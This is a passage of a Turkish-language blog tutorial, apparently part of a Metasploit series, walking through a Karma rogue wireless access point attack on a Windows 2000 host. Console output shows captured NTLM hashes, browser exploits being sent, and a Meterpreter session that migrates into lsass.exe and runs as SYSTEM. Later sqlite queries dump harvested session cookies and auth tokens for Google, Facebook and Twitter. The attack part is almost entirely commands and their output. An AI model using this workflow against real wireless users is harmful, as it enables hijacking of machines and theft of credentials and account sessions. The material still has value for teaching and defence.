<strong>[</strong><strong>*</strong><strong>]</strong> Received 10.0.0.100:1365 TARGET\P0WN3D LMHASH:3cd170ac4f807291a1b90da20bb8eb228cf50aaf5373897d NTHASH:ddb2b9bed56faf557b1a35d3687fc2c8760a5b45f1d1f4cd OS:Windows 2000 2195 LM:Windows 2000 5.0
<strong>[</strong><strong>*</strong><strong>]</strong> Authenticating to 10.0.0.100 as TARGET\P0WN3D...
<strong>[</strong><strong>*</strong><strong>]</strong> AUTHENTICATED as TARGET\P0WN3D...
<strong>[</strong><strong>*</strong><strong>]</strong> Ignoring request from 10.0.0.100, attack already <strong>in </strong>progress.
<strong>[</strong><strong>*</strong><strong>]</strong> Sending Access Denied to 10.0.0.100:1365 TARGET\P0WN3D
<strong>[</strong><strong>*</strong><strong>]</strong> Sending Apple QuickTime 7.1.3 RTSP URI Buffer Overflow to 10.0.0.100:1278...
<strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>2650 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Sending iPhone MobileSafari LibTIFF Buffer Overflow to 10.0.0.100:1367...
<strong>[</strong><strong>*</strong><strong>]</strong> HTTP REQUEST 10.0.0.100 <strong>&gt;</strong> <a href="http://www.care2.com/">www.care2.com:80</a> GET / Windows IE 5.01 cookies<strong>=</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Sleeping before handling stage...
<strong>[</strong><strong>*</strong><strong>]</strong> HTTP REQUEST 10.0.0.100 <strong>&gt;</strong> <a href="http://www.yahoo.com/">www.yahoo.com:80</a> GET / Windows IE 5.01 cookies<strong>=</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> HTTP REQUEST 10.0.0.100 <strong>&gt;</strong> <a href="http://yahoo.com/">yahoo.com</a>:80 GET / Windows IE 5.01 cookies<strong>=</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Uploading DLL <strong>(</strong>75787 bytes<strong>)</strong>...
<strong>[</strong><strong>*</strong><strong>]</strong> Upload completed.
<strong>[</strong><strong>*</strong><strong>]</strong> Migrating to lsass.exe...
<strong>[</strong><strong>*</strong><strong>]</strong> Current server process: rundll32.exe <strong>(</strong>848<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> New server process: lsass.exe <strong>(</strong>232<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 1 opened <strong>(</strong>10.0.0.1:45017 -&gt; 10.0.0.100:1364<strong>)</strong>
</code></pre>
<!-- /wp:code -->

  Bu kısımda, kullanıcının parola bilgilerinin, cookie bilgilerinin toplandığı görülmektedir. Bu işlemlerin ardından, hedef bilgisayarda oturum açılmaya çalışılmaktadır. 
 

  Açılan Meterpreter oturumunda neler yapılabileceğine bakalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf auxiliary<strong>(</strong>http<strong>)</strong> <strong>&gt;</strong> sessions -i 1
<strong>[</strong><strong>*</strong><strong>]</strong> Starting interaction with 1...

meterpreter <strong>&gt;</strong> ps

Process list
<strong>============</strong>

    PID   Name               Path                                                          
    ---   ----               ----                                                          
    144   smss.exe           \SystemRoot\System32\smss.exe                                 
    172   csrss.exe          \??\C:\WINNT\system32\csrss.exe                               
    192   winlogon.exe       \??\C:\WINNT\system32\winlogon.exe                            
    220   services.exe       C:\WINNT\system32\services.exe                                
    232   lsass.exe          C:\WINNT\system32\lsass.exe                                   
    284   firefox.exe        C:\Program Files\Mozilla Firefox\firefox.exe                  
    300   KodakImg.exe       C:\Program Files\Windows NT\Accessories\ImageVueKodakImg.exe 
    396   svchost.exe        C:\WINNT\system32\svchost.exe                                 
    416   spoolsv.exe        C:\WINNT\system32\spoolsv.exe                                 
    452   svchost.exe        C:\WINNT\System32\svchost.exe                                 
    488   regsvc.exe         C:\WINNT\system32\regsvc.exe                                  
    512   MSTask.exe         C:\WINNT\system32\MSTask.exe                                  
    568   VMwareService.exe  C:\Program Files\VMware\VMware Tools\VMwareService.exe        
    632   WinMgmt.exe        C:\WINNT\System32\WBEM\WinMgmt.exe                            
    696   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe        
    760   Explorer.exe       C:\WINNT\Explorer.exe                                         
    832   VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe           
    848   rundll32.exe       C:\WINNT\system32\rundll32.exe                                
    860   VMwareUser.exe     C:\Program Files\VMware\VMware Tool\VMwareUser.exe           
    884   RtWLan.exe         C:\Program Files\ASUS WiFi-AP Solo\RtWLan.exe                 
    916   TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe        
    952   SCardSvr.exe       C:\WINNT\System32\SCardSvr.exe                                
    1168  IEXPLORE.EXE       C:\Program Files\Internet Explorer\IEXPLORE.EXE               

meterpreter <strong>&gt;</strong> ipconfig /all

VMware Accelerated AMD PCNet Adapter
Hardware MAC: 00:0c:29:85:81:55
IP Address  : 0.0.0.0
Netmask     : 0.0.0.0



Realtek RTL8187 Wireless LAN USB NIC                                    
Hardware MAC: 00:c0:ca:1a:e7:d4
IP Address  : 10.0.0.100
Netmask     : 255.255.255.0



MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0


meterpreter <strong>&gt;</strong> pwd
C:\WINNT\system32
meterpreter <strong>&gt;</strong> getuid
Server username: NT AUTHORITY\SYSTEM
</code></pre>
<!-- /wp:code -->

  Gördüğünüz gibi, açılan oturumda neler yapılabileceğini örnek olarak gösterdik. Ayrıca bilgi toplama devam ettikçe inanılmaz çok bilgi kayıt edilecektir. Bunların kullanımı için veri tabanına bakmak ihtiyacı hissedebilirsiniz. Şimdi veri tabanı ile etkileşim sağlayalım. 
 

  Veri tabanı Ev klasöründe oluşturulmuştu. Aşağıdaki komut ile veri tabanına bağlanalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# sqlite3 karma.db
SQLite version 3.5.9
Enter ".help" <strong>for </strong>instructions
sqlite&gt; .schema
CREATE TABLE hosts <strong>(</strong>
'id' INTEGER PRIMARY KEY NOT NULL,
'created' TIMESTAMP,
'address' VARCHAR<strong>(</strong>16<strong>)</strong> UNIQUE,
'comm' VARCHAR<strong>(</strong>255<strong>)</strong>,
'name' VARCHAR<strong>(</strong>255<strong>)</strong>,
'state' VARCHAR<strong>(</strong>255<strong>)</strong>,
'desc' VARCHAR<strong>(</strong>1024<strong>)</strong>,
'os_name' VARCHAR<strong>(</strong>255<strong>)</strong>,
'os_flavor' VARCHAR<strong>(</strong>255<strong>)</strong>,
'os_sp' VARCHAR<strong>(</strong>255<strong>)</strong>,
'os_lang' VARCHAR<strong>(</strong>255<strong>)</strong>,
'arch' VARCHAR<strong>(</strong>255<strong>)</strong>
<strong>)</strong>;
CREATE TABLE notes <strong>(</strong>
'id' INTEGER PRIMARY KEY NOT NULL,
'created' TIMESTAMP,
'host_id' INTEGER,
'ntype' VARCHAR<strong>(</strong>512<strong>)</strong>,
'data' TEXT
<strong>)</strong>;
CREATE TABLE refs <strong>(</strong>
'id' INTEGER PRIMARY KEY NOT NULL,
'ref_id' INTEGER,
'created' TIMESTAMP,
'name' VARCHAR<strong>(</strong>512<strong>)</strong>
<strong>)</strong>;
CREATE TABLE reports <strong>(</strong>
'id' INTEGER PRIMARY KEY NOT NULL,
'target_id' INTEGER,
'parent_id' INTEGER,
'entity' VARCHAR<strong>(</strong>50<strong>)</strong>,
'etype' VARCHAR<strong>(</strong>50<strong>)</strong>,
'value' BLOB,
'notes' VARCHAR,
'source' VARCHAR,
'created' TIMESTAMP
<strong>)</strong>;
CREATE TABLE requests <strong>(</strong>
'host' VARCHAR<strong>(</strong>20<strong>)</strong>,
'port' INTEGER,
'ssl' INTEGER,
'meth' VARCHAR<strong>(</strong>20<strong>)</strong>,
'path' BLOB,
'headers' BLOB,
'query' BLOB,
'body' BLOB,
'respcode' VARCHAR<strong>(</strong>5<strong>)</strong>,
'resphead' BLOB,
'response' BLOB,
'created' TIMESTAMP
<strong>)</strong>;
CREATE TABLE services <strong>(</strong>
'id' INTEGER PRIMARY KEY NOT NULL,
'host_id' INTEGER,
'created' TIMESTAMP,
'port' INTEGER NOT NULL,
'proto' VARCHAR<strong>(</strong>16<strong>)</strong> NOT NULL,
'state' VARCHAR<strong>(</strong>255<strong>)</strong>,
'name' VARCHAR<strong>(</strong>255<strong>)</strong>,
'desc' VARCHAR<strong>(</strong>1024<strong>)</strong>
<strong>)</strong>;
CREATE TABLE targets <strong>(</strong>
'id' INTEGER PRIMARY KEY NOT NULL,
'host' VARCHAR<strong>(</strong>20<strong>)</strong>,
'port' INTEGER,
'ssl' INTEGER,
'selected' INTEGER
<strong>)</strong>;
CREATE TABLE vulns <strong>(</strong>
'id' INTEGER PRIMARY KEY NOT NULL,
'service_id' INTEGER,
'created' TIMESTAMP,
'name' VARCHAR<strong>(</strong>1024<strong>)</strong>,
'data' TEXT
<strong>)</strong>;
CREATE TABLE vulns_refs <strong>(</strong>
'ref_id' INTEGER,
'vuln_id' INTEGER
<strong>)</strong>;
</code></pre>
<!-- /wp:code -->

  Veri tabanı şemasından faydalanarak bilgileri kontrol edelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">sqlite&gt; <strong>select</strong> <strong>*</strong> from hosts;
1|2009-05-09 23:47:04|10.0.0.100|||alive||Windows|2000|||x86
sqlite&gt; <strong>select</strong> <strong>*</strong> from notes where host_id <strong>=</strong> 1;
1|2009-05-09 23:47:04|1|http_cookies|en-us.start2.mozilla.com __utma<strong>=</strong>183859642.1221819733.1241334886.1241334886.1241334886.1; __utmz<strong>=</strong>183859642.1241334886.1.1.utmccn<strong>=(</strong>organic<strong>)</strong>|utmcsr<strong>=</strong>google|utmctr<strong>=</strong>firefox|utmcmd<strong>=</strong>organic
2|2009-05-09 23:47:04|1|http_request|en-us.start2.mozilla.com:80 GET /firefox Windows FF 1.9.0.10
3|2009-05-09 23:47:05|1|http_cookies|adwords.google.com PREF<strong>=</strong>ID<strong>=</strong>ee60297d21c2a6e5:U<strong>=</strong>ecaec12d78faa1ba:TM<strong>=</strong>1241913986:LM<strong>=</strong>1241926890:GM<strong>=</strong>1:S<strong>=</strong>-p5nGxSz_oh1inss; NID<strong>=</strong>22<strong>=</strong>Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID<strong>=</strong>DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
4|2009-05-09 23:47:05|1|http_request|adwords.google.com:80 GET /forms.html Windows FF 1.9.0.10
5|2009-05-09 23:47:05|1|http_request|blogger.com:80 GET /forms.html Windows FF 1.9.0.10
6|2009-05-09 23:47:05|1|http_request|care.com:80 GET /forms.html Windows FF 1.9.0.10
7|2009-05-09 23:47:05|1|http_request|0.0.0.0:55550 GET /ads Windows Firefox 3.0.10
8|2009-05-09 23:47:06|1|http_request|careerbuilder.com:80 GET /forms.html Windows FF 1.9.0.10
9|2009-05-09 23:47:06|1|http_request|ecademy.com:80 GET /forms.html Windows FF 1.9.0.10
10|2009-05-09 23:47:06|1|http_cookies|facebook.com datr<strong>=</strong>1241925583-120e39e88339c0edfd73fab6428ed813209603d31bd9d1dccccf3; ABT<strong>=</strong>::#b0ad8a8df29cc7bafdf91e67c86d58561st0:1242530384:A#2dd086ca2a46e9e50fff44e0ec48cb811st0:1242530384:B; s_vsn_facebookpoc_1<strong>=</strong>7269814957402
11|2009-05-09 23:47:06|1|http_request|facebook.com:80 GET /forms.html Windows FF 1.9.0.10
12|2009-05-09 23:47:06|1|http_request|gather.com:80 GET /forms.html Windows FF 1.9.0.10
13|2009-05-09 23:47:06|1|http_request|gmail.com:80 GET /forms.html Windows FF 1.9.0.10
14|2009-05-09 23:47:06|1|http_cookies|gmail.google.com PREF<strong>=</strong>ID<strong>=</strong>ee60297d21c2a6e5:U<strong>=</strong>ecaec12d78faa1ba:TM<strong>=</strong>1241913986:LM<strong>=</strong>1241926890:GM<strong>=</strong>1:S<strong>=</strong>-p5nGxSz_oh1inss; NID<strong>=</strong>22<strong>=</strong>Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID<strong>=</strong>DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
15|2009-05-09 23:47:07|1|http_request|gmail.google.com:80 GET /forms.html Windows FF 1.9.0.10
16|2009-05-09 23:47:07|1|http_cookies|google.com PREF<strong>=</strong>ID<strong>=</strong>ee60297d21c2a6e5:U<strong>=</strong>ecaec12d78faa1ba:TM<strong>=</strong>1241913986:LM<strong>=</strong>1241926890:GM<strong>=</strong>1:S<strong>=</strong>-p5nGxSz_oh1inss; NID<strong>=</strong>22<strong>=</strong>Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID<strong>=</strong>DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
17|2009-05-09 23:47:07|1|http_request|google.com:80 GET /forms.html Windows FF 1.9.0.10
18|2009-05-09 23:47:07|1|http_request|linkedin.com:80 GET /forms.html Windows FF 1.9.0.10

101|2009-05-09 23:50:03|1|http_cookies|safebrowsing.clients.google.com PREF<strong>=</strong>ID<strong>=</strong>ee60297d21c2a6e5:U<strong>=</strong>ecaec12d78faa1ba:TM<strong>=</strong>1241913986:LM<strong>=</strong>1241926890:GM<strong>=</strong>1:S<strong>=</strong>-p5nGxSz_oh1inss; NID<strong>=</strong>22<strong>=</strong>Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID<strong>=</strong>DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
102|2009-05-09 23:50:03|1|http_request|safebrowsing.clients.google.com:80 POST /safebrowsing/downloads Windows FF 1.9.0.10
108|2009-05-10 00:43:29|1|http_cookies|twitter.com auth_token<strong>=</strong>1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
109|2009-05-10 00:43:29|1|http_cookies|www.twitter.com auth_token<strong>=</strong>1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
sqlite&gt;
</code></pre>
<!-- /wp:code -->

  Buradan ötesi, sizin veri tabanı bilginize ve kayıt edilen bilgilerin raporlanmasına kalmış durumdadır. 
 